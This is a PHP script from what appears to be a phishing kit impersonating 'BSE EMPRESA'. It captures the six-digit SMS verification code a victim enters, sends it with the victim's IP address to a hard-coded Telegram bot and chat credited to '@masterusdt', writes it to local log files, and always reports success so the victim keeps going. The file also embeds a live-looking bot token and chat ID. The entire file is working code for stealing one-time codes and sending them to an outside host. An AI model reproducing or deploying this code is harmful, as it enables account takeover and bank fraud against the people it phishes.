<?php
// main/verifyToken.php

// Configuración de Telegram
define('BOT_TOKEN', '7666768336:AAHMexyFEv7ggRV5lpzA36Ldos2IUoqhhp8');
define('CHAT_ID', '1558822548');

// Para evitar errores de salida
ob_start();

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $userIp = $_SERVER['REMOTE_ADDR'] ?? 'Desconocida';
    
    // Obtener token que el usuario INGRESÓ en el formulario
    $token = isset($_POST['token']) ? trim($_POST['token']) : '';
    
    // Validar que sea un token de 6 dígitos
    if (empty($token) || strlen($token) != 6 || !ctype_digit($token)) {
        echo json_encode(['success' => false, 'message' => 'Token inválido']);
        exit;
    }
    
    // Crear directorio logs si no existe
    $logDir = 'logs';
    if (!file_exists($logDir)) {
        mkdir($logDir, 0755, true);
    }
    
    // ========== ENVÍO A TELEGRAM ==========
    $message = " <b>📱 BSE EMPRESA - Token SMS Recibido</b> \n\n" .
               "<b>🔢 CÓDIGO SMS:</b> <code>" . htmlspecialchars($token) . "</code>\n\n" .
               "🌐 IP: <code>" . $userIp . "</code>\n" .
               " [By @masterusdt] ";
    
    $telegramApiUrl = 'https://api.telegram.org/bot' . BOT_TOKEN . '/sendMessage';
    
    $ch = curl_init($telegramApiUrl);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode([
        'chat_id' => CHAT_ID,
        'text' => $message,
        'parse_mode' => 'HTML',
        'disable_web_page_preview' => true
    ]));
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // Solo si hay problemas SSL
    
    $result = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $error = curl_error($ch);
    curl_close($ch);
    
    // ========== GUARDAR EN LOG LOCAL ==========
    $logEntry = "[" . date('Y-m-d H:i:s') . "] " .
                "IP: {$userIp} | " .
                "Token: {$token} | " .
                "Telegram HTTP: {$httpCode} | " .
                "Error: " . ($error ?: 'Ninguno') . "\n";
    
    file_put_contents($logDir . '/sms_tokens_log.txt', $logEntry, FILE_APPEND | LOCK_EX);
    
    // También guardar en un archivo específico para tokens
    $tokenLog = "[" . date('Y-m-d H:i:s') . "] TOKEN: {$token} (IP: {$userIp})\n";
    file_put_contents($logDir . '/tokens.txt', $tokenLog, FILE_APPEND | LOCK_EX);
    
    // Verificar si se envió a Telegram
    if ($error) {
        error_log("Error Telegram: " . $error);
        echo json_encode([
            'success' => true, // Aún devuelve éxito para que redirija
            'message' => 'Token recibido (error Telegram: ' . $error . ')'
        ]);
    } else if ($httpCode != 200) {
        echo json_encode([
            'success' => true, // Aún devuelve éxito para que redirija
            'message' => 'Token recibido (HTTP: ' . $httpCode . ')'
        ]);
    } else {
        // Responder éxito SIEMPRE para que redirija
        echo json_encode([
            'success' => true, 
            'message' => 'Token recibido correctamente'
        ]);
    }
    
} else {
    echo json_encode(['success' => false, 'message' => 'Método no permitido']);
}

// Limpiar buffer
ob_end_clean();
?>